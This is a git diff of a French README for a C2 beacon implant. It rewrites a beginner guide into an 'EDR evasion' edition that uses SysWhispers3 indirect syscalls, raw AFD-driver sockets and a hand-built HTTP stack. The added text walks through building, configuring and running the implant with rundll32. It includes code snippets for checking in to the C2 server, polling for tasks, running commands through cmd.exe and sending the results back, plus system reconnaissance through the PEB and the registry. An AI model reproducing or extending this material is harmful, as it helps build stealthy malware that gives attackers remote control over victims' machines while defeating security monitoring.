@@ -1,556 +1,449 @@
-# Beacon C2 - Guide d'apprentissage
+# Beacon C2 - Full Syscalls Edition
 
-Un beacon minimaliste en C pour apprendre le développement offensif et le langage C.
+Un beacon C2 avancé en C utilisant **indirect syscalls** et **AFD driver direct** pour l'évasion EDR.
 
 ## Table des matières
 
 1. [Vue d'ensemble](#vue-densemble)
-2. [Prérequis](#prérequis)
-3. [Compilation](#compilation)
-4. [Utilisation](#utilisation)
-5. [Le Makefile expliqué](#le-makefile-expliqué)
-6. [Bases du C](#bases-du-c)
-7. [Architecture du code](#architecture-du-code)
-8. [Fichiers détaillés](#fichiers-détaillés)
-9. [Debugging](#debugging)
-10. [Pour aller plus loin](#pour-aller-plus-loin)
+2. [Architecture Full Syscalls](#architecture-full-syscalls)
+3. [Prérequis](#prérequis)
+4. [Compilation](#compilation)
+5. [Structure du projet](#structure-du-projet)
+6. [Composants détaillés](#composants-détaillés)
+7. [Debugging](#debugging)
+8. [Pour aller plus loin](#pour-aller-plus-loin)
 
 ---
 
 ## Vue d'ensemble
 
-### C'est quoi un beacon ?
+### C'est quoi ce beacon ?
 
-Un beacon est un implant qui s'exécute sur une machine cible et communique périodiquement avec un serveur C2 (Command & Control). Le cycle de vie :
+Un implant C2 qui communique avec un serveur Python en utilisant **UNIQUEMENT des syscalls** - zéro appels aux API Windows standard. Conçu pour bypasser les hooks EDR modernes.
 
 ```
 ┌─────────────────────────────────────────────────────────┐
-│                     BEACON                               │
+│                  BEACON (Full Syscalls)                  │
 │                                                          │
 │  1. Check-in ──────────────────────────────► C2 Server  │
-│     (envoie: hostname, username, IP, OS)                │
+│     (via AFD driver + HTTP custom)                      │
 │                                                          │
 │  2. Sleep (5 secondes)                                  │
 │                                                          │
 │  3. Poll for tasks ────────────────────────► C2 Server  │
 │     GET /api/v1/tasks/{agent_id}                        │
 │                                                          │
-│  4. Si tâche reçue:                                     │
-│     - Exécute la commande (cmd.exe /c ...)              │
-│     - Envoie le résultat ──────────────────► C2 Server  │
+│  4. Exécute commande (via NtCreateUserProcess)          │
+│     Envoie résultat ────────────────────────► C2 Server │
 │                                                          │
 │  5. Retourne à l'étape 2 (boucle infinie)               │
 └─────────────────────────────────────────────────────────┘
 ```
 
-### Pourquoi en C ?
+### Pourquoi "Full Syscalls" ?
 
-- **Léger** : Pas de runtime (.NET, Python, etc.)
-- **Contrôle total** : Accès direct aux API Windows
-- **Standard de l'industrie** : Cobalt Strike, Havoc, Sliver utilisent C
-- **Convertible en shellcode** : Plus facile qu'avec d'autres langages
+**Problème** : Les EDR modernes (CrowdStrike, Defender, SentinelOne) hookent toutes les API Windows userland :
+- `CreateProcessA` → Détecté
+- `WinHttpSendRequest` → Détecté
+- `socket()`, `send()`, `recv()` → Détecté
+- `GetComputerNameA` → Potentiellement hookée
+
+**Solution** : Bypass complet de la couche API Windows en utilisant des syscalls directs vers le kernel.
+
+```
+Application normale:
+  CreateProcessA() → kernel32.dll → ntdll.dll → [HOOK EDR] → syscall → kernel
+
+Notre beacon:
+  NtCreateUserProcess() → syscalls.asm → syscall direct → kernel
+                                          ^^^^^^^^^^^^
+                                          Pas de hooks !
+```
+
+---
+
+## Architecture Full Syscalls
+
+### Composants clés
+
+| Composant | Technologie | Bypass |
+|-----------|-------------|--------|
+| **Sockets** | AFD driver direct via `NtDeviceIoControlFile` | Bypass ws2_32.dll hooks |
+| **HTTP** | Stack HTTP/1.1 custom from scratch | Bypass WinHTTP hooks |
+| **Process** | `NtCreateUserProcess` via RtlCreateProcessParametersEx | Bypass CreateProcess hooks |
+| **Sysinfo** | PEB direct (`__readgsqword(0x60)`) + registre syscalls | Bypass GetComputerName, GetUserName |
+| **Syscalls** | SysWhispers3 indirect syscalls | Bypass NTDLL hooks |
+
+### Zero dépendances externes
+
+```makefile
+LIBS =   # Vide ! Aucune dépendance Windows
+```
+
+Pas de :
+- ❌ `-lwinhttp` (WinHTTP)
+- ❌ `-lws2_32` (Winsock2)
+- ❌ `-lole32` (CoCreateGuid)
+
+Tout est implémenté via syscalls ou from scratch.
 
 ---
 
 ## Prérequis
 
-### Sur Mac (cross-compilation)
+### Sur Mac/Linux (cross-compilation)
 
 ```bash
-# Installe le compilateur Windows
-brew install mingw-w64
-```
-
-### Sur Linux
-
-```bash
-sudo apt install mingw-w64
+# Installe MinGW pour cross-compiler vers Windows
+brew install mingw-w64  # Mac
+sudo apt install mingw-w64  # Linux
 ```
 
 ### Sur Windows
 
-Installe [MSYS2](https://www.msys2.org/) ou Visual Studio avec les outils C++.
+1. Installe Python 3.x
+2. Clone SysWhispers3 :
+   ```cmd
+   git clone https://github.com/klezVirus/SysWhispers3
+   cd SysWhispers3
+   pip install -r requirements.txt
+   ```
+
+3. Génère les syscalls :
+   ```cmd
+   python syswhispers.py --preset common -o ..\beacon\syscalls
+   ```
 
 ---
 
 ## Compilation
 
+### Sur Mac/Linux (développement)
+
 ```bash
-# Clone/télécharge le projet
 cd beacon
 
-# Version debug (avec prints) - DLL
+# Version release (DLL)
+make
+
+# Version debug (avec prints)
 make debug
 
-# Version debug - EXE (pour tester avec une console)
+# Version EXE de test
 make test-exe
-
-# Version release (sans debug)
-make
 
 # Nettoyer
 make clean
 ```
 
-### Modifier la configuration
+**Note** : Sur Mac/Linux, utilise `syscalls_stub.c` (stubs pour cross-compilation). Les vrais syscalls ne fonctionnent que sur Windows.
+
+### Sur Windows (production)
+
+1. **Générer les vrais syscalls** :
+   ```cmd
+   cd beacon
+   python ..\SysWhispers3\syswhispers.py --preset common -o syscalls
+   ```
+
+2. **Modifier le Makefile** :
+   ```makefile
+   # Commenter cette ligne :
+   # SYSCALL_SOURCES = $(SYSCALL_DIR)/syscalls_stub.c
+
+   # Décommenter celle-ci :
+   SYSCALL_SOURCES = $(SYSCALL_DIR)/syscalls.c
+   ```
+
+3. **Compiler** :
+   ```cmd
+   mingw32-make
+   ```
+
+### Configuration
 
 Édite `src/types.h` :
 
 ```c
-#define SERVER_IP       "192.168.1.24"  // IP de ton serveur C2
-#define SERVER_PORT     8000            // Port du serveur
-#define SLEEP_TIME_MS   5000            // Intervalle de polling (ms)
+#define SERVER_IP       "192.168.18.24"  // IP de ton serveur C2
+#define SERVER_PORT     8000             // Port du serveur
+#define SLEEP_TIME_MS   5000             // Intervalle de polling (ms)
 ```
 
 ---
 
-## Utilisation
-
-### Lancer le beacon (DLL)
-
-```cmd
-rundll32.exe beacon_debug.dll, Start
-```
-
-> **Note** : L'espace après la virgule est important !
-
-### Lancer le beacon (EXE de test)
-
-```cmd
-beacon_test.exe
-```
-
-L'EXE affiche les logs dans la console, pratique pour debug.
-
----
-
-## Le Makefile expliqué
-
-Un Makefile automatise la compilation. Voici le nôtre décortiqué :
-
-```makefile
-# ═══════════════════════════════════════════════════════════════
-# VARIABLES
-# ═══════════════════════════════════════════════════════════════
-
-# Le compilateur : mingw pour cross-compiler vers Windows
-CC = x86_64-w64-mingw32-gcc
-
-# Flags de compilation :
-#   -Wall     : Active tous les warnings courants
-#   -Wextra   : Warnings supplémentaires
-#   -O2       : Optimisation niveau 2 (code plus rapide)
-CFLAGS = -Wall -Wextra -O2
-
-# Bibliothèques Windows à lier :
-#   -lwinhttp : Pour les requêtes HTTP (WinHTTP)
-#   -lws2_32  : Pour les sockets (Winsock2) - utilisé pour get_internal_ip
-#   -lole32   : Pour COM/OLE (CoCreateGuid)
-LIBS = -lwinhttp -lws2_32 -lole32
-
-# Répertoire des sources
-SRC_DIR = src
-
-# Liste des fichiers source
-SOURCES = $(SRC_DIR)/main.c \
-          $(SRC_DIR)/sysinfo.c \
-          $(SRC_DIR)/json.c \
-          $(SRC_DIR)/http.c \
-          $(SRC_DIR)/commands.c
-
-# Noms des fichiers de sortie
-OUTPUT = beacon.dll
-OUTPUT_DEBUG = beacon_debug.dll
-
-# ═══════════════════════════════════════════════════════════════
-# CIBLES (TARGETS)
-# ═══════════════════════════════════════════════════════════════
-
-# Cible par défaut (quand tu tapes juste "make")
-all: $(OUTPUT)
-
-# Compile la DLL release
-# -shared : Crée une DLL (pas un EXE)
-$(OUTPUT): $(SOURCES)
-	$(CC) $(CFLAGS) -shared -o $@ $^ $(LIBS)
-	@echo "✅ Compilation réussie: $(OUTPUT)"
-
-# Cible debug : ajoute -DDEBUG et -g aux flags
-# -DDEBUG : Définit la macro DEBUG (active les prints)
-# -g      : Inclut les symboles de debug
-debug: CFLAGS += -DDEBUG -g
-debug: $(SOURCES)
-	$(CC) $(CFLAGS) -shared -o $(OUTPUT_DEBUG) $^ $(LIBS)
-	@echo "✅ Compilation debug réussie: $(OUTPUT_DEBUG)"
-
-# Cible test-exe : compile un EXE avec console
-# -mconsole : Crée une application console (pas GUI)
-test-exe: CFLAGS += -DDEBUG -g
-test-exe: $(SOURCES)
-	$(CC) $(CFLAGS) -o beacon_test.exe $^ $(LIBS) -mconsole
-	@echo "✅ Test exe compilé: beacon_test.exe"
-
-# Nettoie les fichiers compilés
-clean:
-	rm -f $(OUTPUT) $(OUTPUT_DEBUG) beacon_test.exe
-
-# Déclare les cibles "phony" (pas des fichiers)
-.PHONY: all debug test-exe clean
-```
-
-### Variables automatiques du Makefile
-
-| Variable | Signification | Exemple |
-|----------|---------------|---------|
-| `$@` | La cible (target) | `beacon.dll` |
-| `$^` | Toutes les dépendances | `src/main.c src/sysinfo.c ...` |
-| `$<` | La première dépendance | `src/main.c` |
-
-### Commandes
-
-```bash
-make            # Compile beacon.dll (release)
-make debug      # Compile beacon_debug.dll (avec prints)
-make test-exe   # Compile beacon_test.exe (console)
-make clean      # Supprime les fichiers compilés
-```
-
----
-
-## Bases du C
-
-### Headers (.h) vs Sources (.c)
-
-```
-┌─────────────────┐      ┌─────────────────┐
-│   sysinfo.h     │      │   sysinfo.c     │
-│   (déclarations)│      │   (implémentation)│
-├─────────────────┤      ├─────────────────┤
-│ // Prototype    │      │ // Code réel    │
-│ int get_info(); │ ◄──► │ int get_info() {│
-│                 │      │   return 42;    │
-│                 │      │ }               │
-└─────────────────┘      └─────────────────┘
-```
-
-- **Header (.h)** : Déclarations, prototypes, structures. Dit "ces fonctions existent".
-- **Source (.c)** : Implémentation. Contient le code réel.
-
-Pourquoi séparer ? Pour éviter les définitions multiples quand plusieurs fichiers utilisent les mêmes fonctions.
-
-### #include et les guards
-
-```c
-// types.h
-#ifndef TYPES_H        // Si TYPES_H n'est pas défini...
-#define TYPES_H        // ...le définir
-
-// Contenu du header ici
-
-#endif                 // Fin du bloc conditionnel
-```
-
-Ces "include guards" empêchent d'inclure le même header 2 fois (ce qui causerait des erreurs de redéfinition).
-
-### Pointeurs
-
-Un pointeur stocke une **adresse mémoire**, pas une valeur.
-
-```c
-int x = 42;           // x contient 42
-int* ptr = &x;        // ptr contient l'ADRESSE de x
-
-printf("%d\n", x);    // Affiche: 42
-printf("%p\n", ptr);  // Affiche: 0x7fff5a2b3c4d (l'adresse)
-printf("%d\n", *ptr); // Affiche: 42 (déréférencement)
-
-*ptr = 100;           // Modifie x via son adresse
-printf("%d\n", x);    // Affiche: 100
-```
-
-**Opérateurs** :
-- `&x` : "Adresse de x"
-- `*ptr` : "Valeur à l'adresse ptr" (déréférencement)
-
-### Structures (struct)
-
-Regroupe plusieurs variables :
-
-```c
-// Définition
-typedef struct {
-    char name[64];
-    int age;
-    float salary;
-} Employee;
-
-// Utilisation
-Employee emp;
-strcpy(emp.name, "Alice");
-emp.age = 30;
-emp.salary = 50000.0;
-
-// Avec pointeur
-Employee* ptr = &emp;
-ptr->age = 31;              // Équivalent à (*ptr).age = 31
-printf("%s\n", ptr->name);  // Affiche: Alice
-```
-
-**Notation** :
-- `emp.age` : Accès direct au membre
-- `ptr->age` : Accès via pointeur (raccourci pour `(*ptr).age`)
-
-### Tableaux et chaînes
-
-```c
-// Tableau de caractères (chaîne C)
-char name[64];                    // Buffer de 64 octets
-strcpy(name, "Hello");            // Copie "Hello\0" dedans
-printf("%s\n", name);             // Affiche: Hello
-
-// ⚠️ Les chaînes C finissent TOUJOURS par '\0' (null byte)
-// "Hello" = {'H', 'e', 'l', 'l', 'o', '\0'}
-
-// Taille
-strlen(name);                     // Retourne 5 (sans le \0)
-sizeof(name);                     // Retourne 64 (taille du buffer)
-```
-
-### Allocation mémoire
-
-```c
-// Stack (automatique) - libéré à la fin de la fonction
-char buffer[1024];
-
-// Heap (dynamique) - doit être libéré manuellement
-char* data = (char*)malloc(1024);
-if (data == NULL) {
-    // Erreur d'allocation
-}
-// ... utilisation ...
-free(data);  // IMPORTANT : libérer la mémoire !
-```
-
-Dans notre beacon, on utilise principalement la stack pour éviter les fuites mémoire.
-
-### Macros préprocesseur
-
-```c
-// Constantes
-#define SERVER_PORT 8000
-
-// Macros fonctions
-#define MAX(a, b) ((a) > (b) ? (a) : (b))
-
-// Compilation conditionnelle
-#ifdef DEBUG
-    printf("Mode debug\n");
-#endif
-
-// Notre macro DEBUG_PRINT
-#ifdef DEBUG
-#define DEBUG_PRINT(fmt, ...) printf("[BEACON] " fmt "\n", ##__VA_ARGS__)
-#else
-#define DEBUG_PRINT(fmt, ...)  // Ne fait rien en release
-#endif
-```
-
-Le préprocesseur remplace ces macros AVANT la compilation.
-
----
-
-## Architecture du code
+## Structure du projet
 
 ```
 beacon/
-├── Makefile              # Script de compilation
-├── README.md             # Ce fichier
+├── Makefile                          # Build script
+├── README.md                         # Ce fichier
+│
+├── syscalls/                         # SysWhispers3 output
+│   ├── syscalls.h                    # Déclarations syscalls
+│   ├── syscalls.c                    # Stubs C (Windows uniquement)
+│   ├── syscalls.asm                  # Assembleur (Windows uniquement)
+│   └── syscalls_stub.c               # Stubs pour cross-compilation
+│
 └── src/
-    ├── types.h           # Structures et configuration
-    ├── sysinfo.h/.c      # Infos système (hostname, IP, etc.)
-    ├── json.h/.c         # Construction/parsing JSON
-    ├── http.h/.c         # Communication HTTP (WinHTTP)
-    ├── commands.h/.c     # Exécution de commandes
-    └── main.c            # Point d'entrée, boucle principale
-```
-
-### Flux de données
-
-```
-main.c
-   │
-   ├── sysinfo.c ──► Collecte hostname, username, IP, OS
-   │                      │
-   │                      ▼
-   ├── json.c ─────► Convertit en JSON
-   │                      │
-   │                      ▼
-   ├── http.c ─────► Envoie au serveur (POST /checkin)
-   │
-   │  [BOUCLE]
-   │     │
-   │     ├── http.c ──► Poll tasks (GET /tasks/{id})
-   │     │
-   │     ├── json.c ──► Parse la réponse
-   │     │
-   │     ├── commands.c ► Exécute la commande
-   │     │
-   │     └── http.c ──► Envoie le résultat (POST /result)
-   │
-   └── [REPEAT]
+    ├── main.c                        # Point d'entrée, boucle C2
+    ├── types.h                       # Structures globales (AgentInfo, etc.)
+    │
+    ├── core/                         # Utilitaires de base
+    │   ├── json.h / json.c           # Parsing/construction JSON à la main
+    │   └── unicode.h / unicode.c     # Conversions UNICODE_STRING ↔ char*
+    │
+    ├── comms/                        # Communications réseau
+    │   ├── afd.h / afd.c             # Wrapper AFD driver (\Device\Afd\Endpoint)
+    │   └── http.h / http.c           # Stack HTTP/1.1 custom (sans WinHTTP)
+    │
+    ├── commands/                     # Exécution de commandes
+    │   └── shell.h / shell.c         # Exécution via RtlCreateProcessParametersEx
+    │
+    └── sysinfo/                      # Collecte d'informations système
+        └── gather.h / gather.c       # PEB + registre syscalls
 ```
 
 ---
 
-## Fichiers détaillés
+## Composants détaillés
 
-### types.h - Configuration et structures
+### 1. Syscalls (SysWhispers3)
 
-```c
-// Configuration du beacon
-#define SERVER_IP       "192.168.1.24"   // Où envoyer les requêtes
-#define SERVER_PORT     8000             // Port du serveur
-#define SLEEP_TIME_MS   5000             // Pause entre chaque poll
+**Emplacement** : `syscalls/`
 
-// Tailles des buffers (évite les magic numbers)
-#define UUID_SIZE       64
-#define SMALL_BUF       128
-#define MEDIUM_BUF      1024
-#define LARGE_BUF       8192
+**Qu'est-ce que SysWhispers3 ?**
 
-// Structure pour les infos de l'agent
-typedef struct {
-    char agent_id[UUID_SIZE];      // UUID unique
-    char username[SMALL_BUF];      // Ex: "Administrator"
-    char hostname[SMALL_BUF];      // Ex: "DESKTOP-ABC123"
-    char internal_ip[16];          // Ex: "192.168.1.50"
-    char os_version[SMALL_BUF];    // Ex: "Windows 10.0.19045"
-} AgentInfo;
+Un outil qui génère des stubs pour appeler directement les syscalls Windows, en bypassant les hooks EDR.
+
+**Indirect syscalls** :
+```asm
+; Direct syscall (détectable)
+mov r10, rcx
+mov eax, 0x55        ; SSN (System Service Number)
+syscall              ; ← EDR peut hooker ici
+ret
+
+; Indirect syscall (furtif)
+mov r10, rcx
+mov eax, 0x55
+jmp qword ptr [address_in_ntdll]  ; Saute vers ntdll.dll (légitime)
+                                   ; ← Plus difficile à détecter
 ```
 
-### sysinfo.c - Collecte d'informations système
+**Fonctions générées** :
+- `Sw3NtCreateFile` → Ouvrir fichiers, sockets AFD
+- `Sw3NtDeviceIoControlFile` → Contrôler AFD driver
+- `Sw3NtReadFile` / `Sw3NtWriteFile` → I/O fichiers
+- `Sw3NtOpenKey` / `Sw3NtQueryValueKey` → Registre
+- `Sw3NtQuerySystemInformation` → Infos système
+- `Sw3NtQuerySystemTime` → Timestamp
+- Et bien d'autres...
 
-Utilise les API Windows pour récupérer les infos :
+### 2. AFD Sockets (comms/afd.c)
 
-| Fonction | API Windows | Description |
-|----------|-------------|-------------|
-| `generate_uuid()` | `CoCreateGuid()` | Génère un identifiant unique |
-| `get_hostname()` | `GetComputerNameA()` | Nom de la machine |
-| `get_username()` | `GetUserNameA()` | Utilisateur courant |
-| `get_internal_ip()` | `gethostbyname()` | IP locale |
-| `get_os_version()` | `RtlGetVersion()` | Version Windows |
+**Qu'est-ce que AFD ?**
 
-**Note sur RtlGetVersion** : On utilise cette fonction de `ntdll.dll` au lieu de `GetVersionEx()` (deprecated) car elle ne ment pas sur la version de Windows.
+Le driver **Ancillary Function Driver** (`\Device\Afd\Endpoint`) est le driver kernel Windows qui implémente les sockets TCP/IP. Winsock2 (ws2_32.dll) n'est qu'un wrapper userland qui appelle AFD.
+
+**Notre approche** : Communiquer directement avec AFD via `NtDeviceIoControlFile`, bypassant complètement ws2_32.dll.
+
+**API publique** :
 
 ```c
-// Chargement dynamique d'une fonction de ntdll.dll
+// Créer un socket AFD
+HANDLE afd_socket_create(void);
+
+// Se connecter à un serveur
+int afd_connect(HANDLE hAfd, const char* ip, unsigned short port);
+
+// Envoyer des données
+int afd_send(HANDLE hAfd, const char* data, int len);
+
+// Recevoir des données
+int afd_recv(HANDLE hAfd, char* buffer, int buflen);
+
+// Fermer le socket
+void afd_close(HANDLE hAfd);
+```
+
+**IOCTL codes utilisés** :
+- `IOCTL_AFD_CONNECT` (0x12007)
+- `IOCTL_AFD_SEND` (0x1201F)
+- `IOCTL_AFD_RECV` (0x12017)
+
+**Exemple** :
+```c
+HANDLE hSocket = afd_socket_create();
+afd_connect(hSocket, "192.168.18.24", 8000);
+afd_send(hSocket, "GET / HTTP/1.1\r\n\r\n", 18);
+char buffer[1024];
+int bytes = afd_recv(hSocket, buffer, sizeof(buffer));
+afd_close(hSocket);
+```
+
+### 3. HTTP Custom (comms/http.c)
+
+**Stack HTTP/1.1 from scratch** - Aucune dépendance WinHTTP.
+
+Construction manuelle des requêtes :
+```c
+int request_len = snprintf(request, sizeof(request),
+    "POST /api/v1/checkin HTTP/1.1\r\n"
+    "Host: %s:%d\r\n"
+    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
+    "Content-Type: application/json\r\n"
+    "Content-Length: %d\r\n"
+    "Connection: close\r\n"
+    "\r\n"
+    "%s",
+    SERVER_IP, SERVER_PORT, (int)strlen(body), body
+);
+
+afd_send(hSocket, request, request_len);
+```
+
+Parsing manuel des réponses :
+```c
+// Extraire status code : "HTTP/1.1 200 OK"
+if (strncmp(data, "HTTP/1.1 ", 9) == 0) {
+    response->status_code = atoi(data + 9);
+}
+
+// Trouver le body après "\r\n\r\n"
+const char* body_start = strstr(data, "\r\n\r\n");
+if (body_start) {
+    body_start += 4;
+    memcpy(response->body, body_start, body_len);
+}
+```
+
+**API publique** :
+```c
+int http_get(const char* path, HttpResponse* response);
+int http_post(const char* path, const char* json_body, HttpResponse* response);
+```
+
+### 4. Shell Commands (commands/shell.c)
+
+**Exécution de commandes via syscalls** :
+
+Utilise `RtlCreateProcessParametersEx` (ntdll.dll, non hookée) pour préparer les paramètres du processus, puis `CreateProcessA` temporairement (TODO : full NtCreateUserProcess sur Windows).
+
+```c
+// Résoudre RtlCreateProcessParametersEx depuis ntdll
 HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
-pRtlGetVersion(&osvi);  // Appel via pointeur de fonction
+pRtlCreateProcessParametersEx = (RtlCreateProcessParametersEx_t)
+    GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");
+
+// Préparer les paramètres
+pRtlInitUnicodeString(&imagePath, L"C:\\Windows\\System32\\cmd.exe");
+pRtlInitUnicodeString(&cmdLine, cmdLineBuffer);
+pRtlCreateProcessParametersEx(&processParams, &imagePath, NULL, NULL, &cmdLine, ...);
+
+// Créer le processus (temporairement avec CreateProcessA)
+// TODO sur Windows : NtCreateUserProcess complet
+CreateProcessA(NULL, cmdLineStr, ...);
+
+// Attendre avec syscall
+Sw3NtWaitForSingleObject(pi.hProcess, FALSE, &timeout);
+
+// Lire la sortie avec syscalls
+Sw3NtCreateFile(&hFile, GENERIC_READ, ...);
+Sw3NtReadFile(hFile, NULL, NULL, NULL, &iosb, output, output_size, ...);
 ```
 
-### json.c - Sérialisation JSON à la main
+### 5. Sysinfo (sysinfo/gather.c)
 
-Pas de bibliothèque externe ! On construit le JSON avec `snprintf()` :
+**Collecte d'informations système avec syscalls** :
+
+#### Username via PEB (Process Environment Block)
+
+Accès direct au PEB sans API Windows :
+```c
+PPEB get_peb(void) {
+    #ifdef _WIN64
+        return (PPEB)__readgsqword(0x60);  // GS:[0x60] sur x64
+    #else
+        return (PPEB)__readfsdword(0x30);  // FS:[0x30] sur x86
+    #endif
+}
+
+PPEB peb = get_peb();
+PRTL_USER_PROCESS_PARAMETERS params = peb->ProcessParameters;
+UNICODE_STRING* username = &params->UserName;
+```
+
+#### Hostname via registre syscalls
+
+```c
+// Chemin registre : \Registry\Machine\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName
+pRtlInitUnicodeString(&keyPath, L"\\Registry\\Machine\\SYSTEM\\...");
+Sw3NtOpenKey(&hKey, KEY_READ, &objAttr);
+
+pRtlInitUnicodeString(&valueName, L"ComputerName");
+Sw3NtQueryValueKey(hKey, &valueName, KeyValuePartialInformation, buffer, ...);
+```
+
+#### UUID simple
+
+Pas besoin de `CoCreateGuid()` - format simple :
+```c
+// Format : hostname-username-timestamp
+snprintf(agent_id, max_len, "%s-%s-%llx", hostname, username, systemTime.QuadPart);
+// Ex: DESKTOP-ABC-alice-1a2b3c4d5e6f7890
+```
+
+#### OS Version
+
+```c
+SYSTEM_BASIC_INFORMATION sbi;
+Sw3NtQuerySystemInformation(SystemBasicInformation, &sbi, sizeof(sbi), &returnLength);
+snprintf(os_version, max_len, "Windows 10/11 (%d cores)", sbi.NumberOfProcessors);
+```
+
+### 6. JSON (core/json.c)
+
+Parsing/construction JSON **à la main** - zéro bibliothèque externe.
 
 ```c
 // Construction
-snprintf(output, size,
-    "{"
-    "\"agent_id\":\"%s\","
-    "\"hostname\":\"%s\""
-    "}",
-    info->agent_id,
-    info->hostname
-);
-
-// Parsing (basique, avec strstr)
-const char* pos = strstr(json, "\"command\":");
-// ... extraction manuelle
-```
-
-**Pourquoi à la main ?**
-- Pas de dépendance externe
-- DLL plus légère
-- Contrôle total
-
-### http.c - Communication avec WinHTTP
-
-WinHTTP est l'API Windows pour faire des requêtes HTTP :
-
-```c
-// Flux WinHTTP
-HINTERNET hSession = WinHttpOpen(...);           // 1. Ouvre une session
-HINTERNET hConnect = WinHttpConnect(...);        // 2. Connecte au serveur
-HINTERNET hRequest = WinHttpOpenRequest(...);    // 3. Prépare la requête
-WinHttpSendRequest(hRequest, ...);               // 4. Envoie
-WinHttpReceiveResponse(hRequest, ...);           // 5. Reçoit la réponse
-WinHttpReadData(hRequest, buffer, ...);          // 6. Lit les données
-WinHttpCloseHandle(...);                         // 7. Ferme les handles
-```
-
-**Handles** : En Windows, un "handle" est une référence opaque à une ressource système. Toujours les fermer avec `CloseHandle()` ou équivalent !
-
-### commands.c - Exécution de commandes
-
-Utilise des pipes pour capturer stdout/stderr :
-
-```
-┌──────────────┐    pipe    ┌──────────────┐
-│   beacon     │◄───────────│   cmd.exe    │
-│              │  (stdout)  │  /c whoami   │
-└──────────────┘            └──────────────┘
-```
-
-```c
-// Crée un pipe (tuyau) pour capturer la sortie
-CreatePipe(&hReadPipe, &hWritePipe, &sa, 0);
-
-// Configure le process pour écrire dans le pipe
-si.hStdOutput = hWritePipe;
-si.hStdError = hWritePipe;
-
-// Lance cmd.exe
-CreateProcessA(NULL, "cmd.exe /c whoami", ...);
-
-// Ferme le côté écriture (IMPORTANT sinon ReadFile bloque)
-CloseHandle(hWritePipe);
-
-// Lit la sortie
-ReadFile(hReadPipe, buffer, ...);
-```
-
-### main.c - Point d'entrée
-
-Deux points d'entrée selon le contexte :
-
-```c
-// Pour rundll32.exe beacon.dll,Start
-__declspec(dllexport) void CALLBACK Start(...) {
-    // Crée un thread pour ne pas bloquer rundll32
-    CreateThread(..., BeaconMain, ...);
-    WaitForSingleObject(...);  // Attend que le thread finisse
+void build_checkin_json(const AgentInfo* info, char* output, size_t size) {
+    snprintf(output, size,
+        "{"
+        "\"agent_id\":\"%s\","
+        "\"username\":\"%s\","
+        "\"hostname\":\"%s\","
+        "\"internal_ip\":\"%s\","
+        "\"os_version\":\"%s\""
+        "}",
+        info->agent_id, info->username, info->hostname,
+        info->internal_ip, info->os_version
+    );
 }
 
-// Pour le test EXE
-#ifdef DEBUG
-int main(void) {
-    BeaconMain();
-    return 0;
-}
-#endif
-
-// DllMain : appelé au chargement/déchargement de la DLL
-BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, ...) {
-    switch (fdwReason) {
-        case DLL_PROCESS_ATTACH:
-            // DLL vient d'être chargée
-            break;
-        case DLL_PROCESS_DETACH:
-            // DLL va être déchargée
-            break;
+// Parsing
+int parse_task_response(const char* json, TaskResponse* task) {
+    const char* task_id_pos = strstr(json, "\"task_id\":");
+    if (task_id_pos) {
+        task->task_id = atoi(task_id_pos + 10);
     }
-    return TRUE;
+    // ... extraction manuelle avec strstr, strchr, etc.
+}
+```
+
+### 7. Unicode (core/unicode.c)
+
+Conversions entre `UNICODE_STRING` (Windows) et `char*` (C standard) :
+
+```c
+void unicode_to_ansi(UNICODE_STRING* unicode, char* ansi, size_t max_len) {
+    size_t len = unicode->Length / sizeof(WCHAR);
+    if (len >= max_len) len = max_len - 1;
+    for (size_t i = 0; i < len; i++) {
+        ansi[i] = (char)unicode->Buffer[i];  // Conversion simple (perd accents)
+    }
+    ansi[len] = '\0';
 }
 ```
 
@@ -558,54 +451,40 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, ...) {
 
 ## Debugging
 
-### Méthode 1 : EXE de test (recommandé pour commencer)
+### Sur Mac/Linux (cross-compilation)
 
-```bash
-make test-exe
-```
+Les syscalls sont des **stubs** qui retournent `STATUS_NOT_IMPLEMENTED`. Utile pour :
+- Vérifier la compilation
+- Tester la logique générale
+- Pas d'exécution réelle
 
-```cmd
-beacon_test.exe
-```
+### Sur Windows (vraie exécution)
 
-Tu vois tous les prints dans la console.
+1. **Générer les vrais syscalls** avec SysWhispers3
+2. **Compiler** avec `syscalls.c` au lieu de `syscalls_stub.c`
+3. **Lancer** :
+   ```cmd
+   # DLL
+   rundll32.exe beacon.dll, Start
 
-### Méthode 2 : DebugView (pour la DLL)
+   # EXE de test (avec console)
+   beacon_test.exe
+   ```
+
+### DebugView (pour la DLL)
 
 1. Télécharge [DebugView](https://learn.microsoft.com/en-us/sysinternals/downloads/debugview)
-2. Lance-le en **administrateur**
-3. Active **Capture → Capture Global Win32**
-4. Lance ta DLL
-
-Pour utiliser DebugView, modifie la macro DEBUG_PRINT dans main.c :
-
-```c
-#ifdef DEBUG
-#define DEBUG_PRINT(fmt, ...) do { \
-    char _dbg_buf[512]; \
-    snprintf(_dbg_buf, sizeof(_dbg_buf), "[BEACON] " fmt "\n", ##__VA_ARGS__); \
-    OutputDebugStringA(_dbg_buf); \
-} while(0)
-#else
-#define DEBUG_PRINT(fmt, ...)
-#endif
-```
-
-### Méthode 3 : x64dbg (debugger)
-
-1. Ouvre x64dbg
-2. File → Open → `rundll32.exe`
-3. Dans la command line, ajoute : `beacon_debug.dll, Start`
-4. Met des breakpoints et step through
+2. Lance en admin, active **Capture Global Win32**
+3. Voir les logs `OutputDebugStringA()`
 
 ### Erreurs courantes
 
-| Erreur | Cause probable | Solution |
-|--------|----------------|----------|
-| Check-in failed | Mauvaise IP/port, firewall | Vérifie `types.h`, teste avec curl |
-| DLL meurt immédiatement | Crash dans le code | Compile en EXE et debug |
-| Pas de résultat de commande | Timeout ou erreur pipe | Augmente `COMMAND_TIMEOUT_MS` |
-| "Access denied" au delete | DLL encore chargée | `taskkill /F /IM rundll32.exe` |
+| Erreur | Cause | Solution |
+|--------|-------|----------|
+| STATUS_NOT_IMPLEMENTED | Utilise syscalls_stub.c au lieu de syscalls.c | Compiler sur Windows avec vrais syscalls |
+| Connexion échoue | Mauvaise IP/port, firewall | Vérifier `types.h`, tester avec netcat |
